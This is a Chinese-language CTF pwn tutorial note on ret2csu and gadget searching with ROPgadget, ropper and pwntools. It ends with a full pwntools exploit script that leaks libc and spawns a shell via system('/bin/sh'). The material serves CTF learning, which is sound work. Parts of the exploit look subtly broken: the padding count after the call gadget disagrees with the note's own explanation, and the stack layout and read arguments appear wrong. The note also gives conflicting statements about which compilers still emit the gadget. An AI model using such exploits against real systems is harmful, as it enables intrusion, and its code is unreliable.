---
title: ret2csu 与 gadget 搜索（ROPgadget / ropper）
category: pwn
tags: [ret2csu, ROPgadget, ropper, __libc_csu_init, gadget]
signals: [二进制里找不到 pop rsi, 只有 pop rdi 一个参数 gadget, 64 位小体积二进制, 静态链接但 gadget 稀少, 需要给 write 三个参数, ROPgadget 只搜到 ret 结尾的片段]
difficulty: medium
source: "CTF-Wiki 中级 ROP / ir0nstone ret2csu / ROPgadget"
tools: [ROPgadget, ropper, pwntools, gdb]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- `ROPgadget --binary pwn | grep "pop rsi"` 空空如也，只有 `pop rdi; ret`。
- 需要调用 `write(1, got, 8)` 这类三参数函数，但凑不出 `rsi`、`rdx`。
- 二进制由 GCC 默认参数编译，存在 `__libc_csu_init` 函数（GCC 8 之前较常见）。
- 题目主程序非常精简（`main` 只有 `read` + `return`），没什么别的可跳。
- 需要连续调用两次函数并控制 `rdx`（比如 `read` 的长度）。

## 二、原理

`__libc_csu_init` 是 GCC 为 `__attribute__((constructor))` 生成 glue，末尾有两个「万能作用域」：

```asm
00000000004011a0 <__libc_csu_init>:
 ...
 4011b0: 4c 89 fa        mov    rdx, r15      ; rdx = r15
 4011b3: 4c 89 f6        mov    rsi, r14      ; rsi = r14
 4011b6: 44 89 ef        mov    edi, r13d     ; edi = r13d
 4011b9: 41 ff 14 dc     call   QWORD PTR [r12 + rbx*8]  ; 调 *(r12+rbx*8)
 4011bd: 48 83 c3 01     add    rbx, 0x1
 4011c1: 48 39 eb        cmp    rbx, rbp
 4011c4: 75 ea           jne    4011b0
 4011c6: 48 83 c4 08     add    rsp, 0x8      ; pop 掉一个填充
 4011ca: 5b              pop    rbx
 4011cb: 5d              pop    rbp
 4011cc: 41 5c           pop    r12
 4011ce: 41 5d           pop    r13
 4011d0: 41 5e           pop    r14
 4011d2: 41 5f           pop    r15
 4011d4: c3              ret
```

利用要点（x86-64）：
- **gadget1**（`0x4011c6`）：从栈弹出 `rbx, rbp, r12, r13, r14, r15`，然后 `ret`。
- **gadget2**（`0x4011b0`）：把 `r15→rdx`、`r14→rsi`、`r13d→edi`，再 `call [r12+rbx*8]`。
- 循环条件 `rbx+1 == rbp` 必须成立，所以令 `rbx = 0, rbp = 1`。
- `r12` 指向存放「目标函数指针」的内存（GOT 项最方便，值就是函数真实地址）。
- `call` 后 `add rsp, 8` 吃掉 8 字节，再弹 6 个寄存器 —— payload 要补齐这 7 个 8 字节。

限制：`edi` 只取 `r13d`（低 32 位），但 64 位程序里 `fd` 等小整数够用。

## 三、checksec 判读与利用思路

```text
RELRO: Partial  Canary: found  NX: enabled  PIE: disabled
```

1. `PIE disabled` ⇒ gadget 地址固定，ret2csu 可直接用。
2. `Full RELRO` ⇒ GOT 只读，但 **ret2csu 调用的是 `[r12+rbx*8]` 里的值，`r12` 可以指向 `.bss` 里自己写的函数地址**，因此仍可绕。
3. gadget 搜索三步法：

```bash
# 1) 找通用寄存器 gadget
ROPgadget --binary ./pwn --only "pop|ret" | grep -E "pop r(ax|bx|cx|dx|si|di|bp|sp|8|9|10|11|12|13|14|15) ; ret"
# 2) 找 syscall / 调用类
ROPgadget --binary ./pwn --only "syscall|int|leave|ret"
# 3) 精确过滤（ropper 支持正则与语义过滤）
ropper --file ./pwn --search "pop rdi; ret"
ropper --file ./pwn --search "xchg r??, r??; ret" --nocolor
```

pwntools 里同样方便：

```python
rop = ROP(elf)
print(rop.gadgets)                       # 全部 gadget
print(rop.find_gadget(["pop rsi", "ret"]))
print(hex(rop.rdi.address), hex(rop.rsi.address))
```

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE \
           else process()

PADDING = b"A" * 0x48                  # 占位偏移

# ---------- 自动定位 __libc_csu_init 两个 gadget ----------
def find_csu_gadgets(e):
    """返回 (gadget1=pop 一串, gadget2=mov+call)，找不到返回 (None, None)"""
    for name in ("__libc_csu_init", "_init_csu", "csu_init"):
        if name in e.sym:
            base = e.sym[name]
            code = e.read(base, 0x100)
            g1 = g2 = None
            # gadget2: "4c 89 fa 4c 89 f6 44 89 ef 41 ff 14 dc"
            pat2 = bytes.fromhex("4c89fa4c89f64489ef41ff14dc")
            pat1 = bytes.fromhex("4883c4085b5d415c415d415e415f c3".replace(" ", ""))
            i = code.find(pat2)
            if i >= 0:
                g2 = base + i
            j = code.find(pat1)
            if j >= 0:
                g1 = base + j
            if g1 and g2:
                return g1, g2
    return None, None

CSU_POP, CSU_CALL = find_csu_gadgets(elf)
if CSU_POP:
    success(f"csu pop  @ {hex(CSU_POP)}")
    success(f"csu call @ {hex(CSU_CALL)}")
else:
    warn("未找到标准 csu gadget，改用 ROP() 自动搜索链")

# ---------- 用 ret2csu 调 write(1, got['read'], 8) ----------
def csu_call(func_ptr_addr, rdi, rsi, rdx, ret_addr):
    """
    func_ptr_addr: 存放目标函数指针的地址（GOT 项 / bss 手写）
    ret_addr     : 返回地址（泄露后回到 main）
    """
    payload  = p64(CSU_POP)
    payload += p64(0)             # rbx = 0
    payload += p64(1)             # rbp = 1  → 循环条件 rbx+1==rbp 成立
    payload += p64(func_ptr_addr) # r12 → 目标函数指针
    payload += p64(rdi)           # r13 → edi
    payload += p64(rsi)           # r14 → rsi
    payload += p64(rdx)           # r15 → rdx
    payload += p64(CSU_CALL)
    payload += p64(0xdeadbeef)    # add rsp,8 的填充
    for _ in range(7):            # pop rbx,rbp,r12,r13,r14,r15 + ret 位
        payload += p64(0xdeadbeef)
    payload += p64(ret_addr)
    return payload

def exp():
    p = start()
    # 覆盖返回地址 → csu → write(1, read@got, 8) → 回 main
    payload  = PADDING
    payload += csu_call(elf.got["read"], 1, elf.got["read"], 8, elf.sym["main"])
    p.sendlineafter(b"> ", payload)

    leaked = u64(p.recvn(8))
    libc = ELF("./libc.so.6", checksec=False)
    libc.address = leaked - libc.sym["read"]
    success(f"read={hex(leaked)} libc={hex(libc.address)}")

    # 第二轮：bss 写 /bin/sh，再 system("/bin/sh")
    bss  = elf.bss(0x200)
    POP_RDI = ROP(elf).find_gadget(["pop rdi", "ret"]).address
    RET     = ROP(elf).find_gadget(["ret"]).address
    chain  = PADDING
    chain += p64(POP_RDI) + p64(bss) + p64(elf.plt["read"])
    chain += csu_call(elf.got["read"], 0, bss, 16, elf.sym["main"])
    p.sendlineafter(b"> ", chain)
    p.send(b"/bin/sh\x00".ljust(16, b"\x00"))

    chain2  = PADDING
    chain2 += p64(POP_RDI) + p64(bss)
    chain2 += p64(RET)                       # 栈对齐
    chain2 += p64(libc.sym["system"])
    p.sendlineafter(b"> ", chain2)
    p.interactive()

if __name__ == "__main__":
    exp()
```

## 五、常见坑 / 变体

- **GCC 8+ / Ubuntu 20.04+ 不生成 `__libc_csu_init`**：题目若来自新版编译器，则无 csu，改用 `pop rdx; pop rbx; ret` 之类的新 gadget，或走 SROP。
- **`r12+rbx*8` 指向可写**：直接指向 GOT 项时需部分 RELRO；Full RELRO 时先 `read` 把函数地址写进 `.bss`。
- **`edi` 截断**：`mov edi, r13d` 只写低 32 位，传大地址（`>`4GB）会坏，`fd`/小整数没事。
- **循环次数**：`rbx=0, rbp=1` 保证只调用一次；`rbx=0, rbp=2` 会连续调两次（可省一跳）。
- **`call` 后 `add rsp,8` 少填**：8 字节填充 + 6 个 pop + 1 个 ret 位，一共 7 个 8 字节，少一个就错位。
- **ropper 与 ROPgadget 结果差异**：ropper 语义更好（`--search "mov rdi, rax"`），ROPgadget 更快；两者都跑一遍最稳。
- **`xchg` 类 gadget**：`xchg rax, rdi; ret` 常用于把返回值搬进参数寄存器。

## 六、参考来源

- [CTF-Wiki: 中级 ROP（ret2csu）](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/)
- [ir0nstone: ret2csu](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2csu)
- [ir0nstone: Gadgets](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/gadgets)
- [JonathanSalwan/ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [sashs/Ropper](https://github.com/sashs/Ropper)
- [pwntools ROP 文档](https://docs.pwntools.com/en/stable/rop/rop.html)
